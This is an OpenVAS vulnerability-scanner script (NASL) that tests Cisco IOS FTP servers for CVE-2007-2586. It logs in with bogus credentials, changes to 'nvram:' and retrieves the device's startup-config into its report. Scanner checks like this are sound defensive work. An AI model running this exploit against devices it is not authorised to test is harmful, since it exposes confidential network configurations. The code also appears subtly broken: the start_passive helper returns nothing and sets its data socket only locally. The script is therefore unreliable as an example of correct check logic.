# OpenVAS Vulnerability Test
# $Id: cisco_ios_ftp_server_auth_bypass.nasl 13613 2019-02-12 16:12:57Z cfischer $
# Description: Cisco IOS FTP Server Authentication Bypass Vulnerability
#
# Authors:
# Ferdy Riphagen
#
# Copyright:
# Copyright (C) 2008 Ferdy Riphagen
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.9999996");
  script_version("$Revision: 13613 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 17:12:57 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2007-2586");
  script_bugtraq_id(23885);
  script_name("Cisco IOS FTP Server Authentication Bypass Vulnerability");
  script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_active");
  script_family("FTP");
  script_copyright("This script is Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("ftp/cisco/ios_ftp/detected");

  script_tag(name:"summary", value:"The Cisco IOS FTP server is enabled on the remote system
  which does not properly verify authentication, allowing for anonymous access to the file system.");

  script_tag(name:"impact", value:"An attacker could use the ftp server to view/download confidential
  configuration files, or upload replacements which will be used at startup.");

  script_xref(name:"URL", value:"http://www.cisco.com/en/US/products/products_security_advisory09186a00808399d0.shtml");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("ftp_func.inc");

function start_passive(port, soc) {

  pasv = ftp_pasv(socket:soc);
  if (!pasv) return NULL;
  soc2 = open_sock_tcp(pasv, transport:get_port_transport(port));
  if (!soc2) return NULL;
  return;
}

port = get_ftp_port( default:21 );
banner = get_ftp_banner(port:port);
if(!banner || "IOS-FTP server" >!< banner)
  exit(0);

# nb: Try to get some directory listing.
# On the other hand ftp_anonymous.nasl is doing this too :-)
soc = open_sock_tcp(port);
if (soc &&
   (ftp_authenticate(socket:soc, user:"blah", pass:"blah"))) {
  if (start_passive(port:port, soc:soc)) {
    send(socket:soc, data:'LIST\r\n');
    recv_listing = ftp_recv_listing(socket:soc2);
    ftp_close(socket:soc2);
  }
}
if (soc) ftp_close(socket:soc);

# That's what it's all about..
if (strlen(recv_listing)) {
  soc = open_sock_tcp(port);
  if (soc &&
     (ftp_authenticate(socket:soc, user:"blah", pass:"blah"))) {
    send(socket:soc, data:'CWD nvram:\r\n');
    recv = ftp_recv_line(socket:soc, retry:1);
    if ("250" >< recv &&
       (start_passive(port:port, soc:soc))) {
      send(socket:soc, data:'RETR startup-config\r\n');
      recv_config = ftp_recv_data(socket:soc2, line:500);
      ftp_close(socket:soc2);
    }
  }
}
if (soc) ftp_close(socket:soc);

if (strlen(recv_config)) {
  report = string("Partial startup-config file:\r\n", recv_config);
  security_message(port:port, data:report);
  exit(0);
}
else if (strlen(recv_listing)) {
  security_message(port:port);
  exit(0);
}